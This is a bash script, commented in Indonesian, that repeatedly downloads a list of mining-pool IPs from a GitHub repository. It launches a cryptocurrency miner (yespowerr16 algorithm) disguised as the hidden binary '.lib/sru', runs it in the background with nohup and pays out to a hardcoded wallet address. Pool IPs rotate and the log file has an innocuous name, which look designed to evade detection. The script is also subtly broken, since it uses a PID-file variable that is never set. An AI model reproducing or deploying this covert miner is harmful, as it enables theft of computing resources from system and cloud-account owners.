while true; do
  timestamp=$(date +%s)
  dynamic_list="list_$timestamp.json"
  
  # Mengunduh dengan timestamp untuk memastikan file terbaru
  wget -O $dynamic_list "https://github.com/barburonjilo/setstra/raw/main/list4.json?$(date +%s)"
  
  if [[ ! -f $dynamic_list ]]; then
    echo "Gagal mengunduh daftar IP. Keluar."
    exit 1
  fi

  # Memeriksa format file JSON
  if ! jq '.' $dynamic_list > /dev/null 2>&1; then
    echo "Format JSON tidak valid. Keluar."
    exit 1
  fi

  # Memilih IP acak dari file JSON
  ip=$(jq -r '.[]' $dynamic_list | shuf -n 1)
  if [ -z "$ip" ]; then
    echo "Tidak ada IP ditemukan di $dynamic_list. Keluar."
    exit 1
  fi

  # Menghapus IP yang dipilih dari file JSON
  jq --arg ip "$ip" 'del(.[] | select(. == $ip))' $dynamic_list > tmp_$timestamp.json && mv tmp_$timestamp.json $dynamic_list

  # Memastikan file sru ada
  if [ -f .lib/sru ]; then
    # Memulai proses sru jika belum berjalan
    if [ ! -f $pid_file ]; then
      port=$(shuf -i 802-810 -n 1)  # Pilih port acak dari 802 hingga 810
      nohup .lib/sru -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 7 -p m=solo > dance.log 2>&1 &
      echo $! > $pid_file
      echo "Memulai proses sru dengan PID $(cat $pid_file) menggunakan IP $ip dan port $port"
    fi

    # Menjalankan selama 1 menit
    sleep 60
  else
    echo ".lib/sru tidak ditemukan. Melewati..."
    sleep 120
  fi

  # Menunggu sebelum iterasi berikutnya
  sleep 120

  # Membersihkan setelah setiap iterasi
  rm -f $dynamic_list
done
